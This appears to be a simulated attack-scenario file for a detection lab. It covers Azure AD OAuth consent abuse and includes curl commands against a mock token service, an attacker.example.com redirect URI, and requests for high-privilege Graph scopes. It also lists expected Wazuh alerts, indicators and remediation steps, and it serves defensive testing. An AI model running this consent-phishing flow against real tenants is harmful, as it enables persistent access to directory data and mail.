name: Azure AD Application Consent Abuse
description: Attacker creates a malicious OAuth application registration requesting excessive API permissions, then tricks an admin into granting consent to gain persistent access to Azure AD resources
real_world_relevance: Nobelium (SolarWinds) abused OAuth app registrations for persistence, Microsoft Midnight Blizzard attack used OAuth apps, common in BEC attacks targeting M365 tenants

attack_flow.description: Attacker registers a malicious OAuth app with excessive permission requests, obtains admin consent, then uses the granted permissions to access sensitive Azure AD and Graph API resources
diagram: 1. Attacker registers OAuth application in Azure AD
2. Configure app to request high-privilege API permissions (Directory.ReadWrite.All, Mail.Read)
3. Craft consent phishing URL and send to tenant admin
4. Admin grants consent, application receives delegated permissions
5. Use application credentials to access Graph API and exfiltrate data

phases.name: OAuth Application Registration
phases.description: Register a malicious OAuth app with excessive permission requests

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/authorize -H 'Content-Type: application/json' -d '{"client_id":"malicious-app-001","scope":"https://graph.microsoft.com/.default Directory.ReadWrite.All Mail.Read User.Read.All","redirect_uri":"https://attacker.example.com/callback","response_type":"code","prompt":"admin_consent"}' 2>/dev/null | python3 -m json.tool || echo 'OAuth app registration failed'
actions.description: Register OAuth app requesting admin-level Graph API permissions

phases.name: Admin Consent Acquisition
phases.description: Simulate admin granting consent to the malicious application

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=malicious-app-001&client_secret=attacker-secret-value&scope=https://graph.microsoft.com/.default&tenant=victim-tenant-id' 2>/dev/null | python3 -m json.tool || echo 'Token request failed'
actions.description: Exchange client credentials for access token after consent granted

phases.name: Graph API Access
phases.description: Use granted permissions to access Azure AD resources

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=malicious-app-001&client_secret=attacker-secret-value&scope=Directory.ReadWrite.All Mail.Read' 2>/dev/null | python3 -m json.tool || echo 'Privileged token request failed'
actions.description: Request token with Directory.ReadWrite.All permissions for data exfiltration

phases.name: Data Exfiltration
phases.description: Exfiltrate sensitive data via Graph API

actions.command: echo '[SIMULATED] Using Graph API token to enumerate users, read mail, and download directory data'
actions.description: Simulate data exfiltration via Graph API with elevated permissions

indicators_of_compromise.description: OAuth application consent request with high privileges
Azure AD admin consent granted to new application

expected_wazuh_alerts.description: NHI: OAuth application consent request with high privileges
NHI: Azure AD admin consent granted to new application

immediate: Revoke consent for suspicious applications in Azure AD Enterprise Applications
Audit sign-in logs for the compromised application client ID
long_term: Restrict user consent to verified publishers only (Azure AD Consent Settings)
Implement admin consent workflow requiring approval for new applications
Monitor for new app registrations with high-privilege API permissions
Configure Conditional Access policies for application access

references.title: MITRE ATT&CK T1098.003 - Additional Cloud Roles
